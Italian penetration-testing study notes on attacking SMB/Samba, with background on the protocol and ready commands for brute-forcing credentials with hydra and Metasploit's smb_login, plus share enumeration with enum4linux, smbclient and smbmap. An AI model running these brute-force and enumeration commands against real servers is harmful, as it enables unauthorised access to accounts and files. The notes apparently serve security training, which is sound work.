- SMB (Server Message Block) è un protocollo di condivisione dei file di rete utilizzato
per facilitare la condivisione di file e periferiche tra i computer di una rete locale (LAN).
- SMB utilizza la porta 445 (TCP). Tuttavia, in origine, SMB funzionava sopra
NetBIOS, utilizzando la porta 139.
- Samba è l'implementazione Linux di SMB e consente ai sistemi Windows di accedere
alle condivisioni e ai dispositivi Linux.
- SAMBA utilizza l'autenticazione con nome utente e password per ottenere l'accesso al server o a una
condivisione di rete.
- Possiamo eseguire un attacco di forza bruta sul server SAMBA per ottenere credenziali legittime.
- Dopo aver ottenuto le credenziali legittime, possiamo utilizzare un'utility chiamata SMBMap per
enumerare le unità di condivisione SAMBA, elencare il contenuto delle condivisioni, scaricare file ed
eseguire comandi remoti sulla destinazione.
- Possiamo anche utilizzare uno strumento chiamato smbclient. smbclient è un client che fa parte della
suite di software SAMBA. Comunica con un server LAN Manager, offrendo un'interfaccia simile a quella
del programma ftp. Può essere usato per scaricare file dal server alla macchina locale, caricare file dalla
macchina locale al server e recuperar

EXPLOIT usare hydra e enum4linx per best enumeration

utilizzare hydra, trova piu user e password ed è piu veloce

- **hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP_TARGET smb**
- **hydra -l USERNAME -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP_TARGET smb**

ENUMERAZIONE CON enum4linux (enumera tutto)

- **enum4linux** apre il menu opzioni
- **enum4linux -a IP_TARGET** enumera info SE una info dice “server doesn’t allow session using username … vuol dire che il servizio è configurato bene e non mostrerà tutte le info
- **enum4linux -a -u USERNAME -p PASSOWORD IP_TARGET**

EXPLOIT

- **smbclient -L IP_TARGET -U NOME_UTENTE**
    - **-L** permette di visualizzare quali servizi sono disponibili sul target
    - **-U** entra con il nome utente indicato
- **smbclient //IP_TARGET/SHARENAME -U** **NOME_UTENTE**  crea shell all’interno dell’user
    - **//** si indica il pattern della della directory solo

alcuni comandi utili

- **?** apre menu comandi
- **dir** lista directory
- **cd**

BASH SCRIPT

- [script per trovare shares vulnerabili ad Anonymous](https://www.notion.so/Trovare-vulnerabilit-anonymous-tra-le-share-di-un-IP-TARGET-db14b73e78734280863e15f74a9f1591?pvs=21)

### VERSIONE ALTERNATIVA MA POCO EFFICACE

ENUMERAZIONE SHARE, VEDIAMO ANCHE PRIVILEGI

- **smbmap -H IP_TARGET -u USERNAME-p PASSWORD** enumera share e privilegi

CON METASPLOIT

- **auxiliary/scanner/smb/smb_login** bruteforce per entrare in un account
    1. **set SMBUser admin** utilizziamo sempre l’utente admin
    2. **set PASS_FILE /**usr/share/metasploit-framework/data/wordlists/unix_passwords.txt **oppure** /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
    3. **set STOP_ON_SUCCESS true**
    
    ENUMRAZIONE SHARE
    
- **scanner/smb/smb_enumshares** per enumerazione cartelle
    - set smbpass
    - set smbuser
    - set rhosts
    - run
